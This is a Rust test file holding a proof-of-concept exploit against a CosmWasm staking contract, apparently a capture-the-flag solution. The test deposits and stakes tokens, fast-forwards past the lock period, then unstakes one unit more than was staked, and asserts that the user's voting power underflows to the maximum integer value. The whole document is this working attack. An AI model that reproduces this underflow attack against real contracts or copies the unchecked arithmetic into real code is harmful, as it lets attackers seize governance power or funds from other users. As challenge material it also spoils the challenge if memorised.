// cargo test --release -- exploit::exploit::exploit --exact --nocapture

#[cfg(test)]
pub mod exploit {
    use crate::{
        contract::{DENOM, LOCK_PERIOD},
        integration_tests::tests::{base_scenario, INITIAL_USER_AMOUNT, USER},
        msg::{ExecuteMsg, QueryMsg},
    };
    use cosmwasm_std::{coin, Addr};
    use cw_multi_test::Executor;

    #[test]
    fn exploit() {
        let (mut app, contract_addr) = base_scenario();

        let player = Addr::unchecked(USER);

        // deposit funds
        let msg = ExecuteMsg::Deposit {};
        app.execute_contract(
            player.clone(),
            contract_addr.clone(),
            &msg,
            &[coin(INITIAL_USER_AMOUNT.u128(), DENOM)],
        )
        .unwrap();

        let msg = ExecuteMsg::Stake {
            lock_amount: INITIAL_USER_AMOUNT.u128(),
        };
        app.execute_contract(player.clone(), contract_addr.clone(), &msg, &[])
            .unwrap();

        // fast forward time
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        // normal stake
        let msg = ExecuteMsg::Unstake {
            unlock_amount: INITIAL_USER_AMOUNT.u128() + 1,
        };
        app.execute_contract(player.clone(), contract_addr.clone(), &msg, &[])
            .unwrap();

        let msg = QueryMsg::GetVotingPower {
            user: (&USER).to_string(),
        };
        let voting_power: u128 = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        println!("voting_power: {}", voting_power);
        assert_eq!(voting_power, u128::MAX);
    }
}
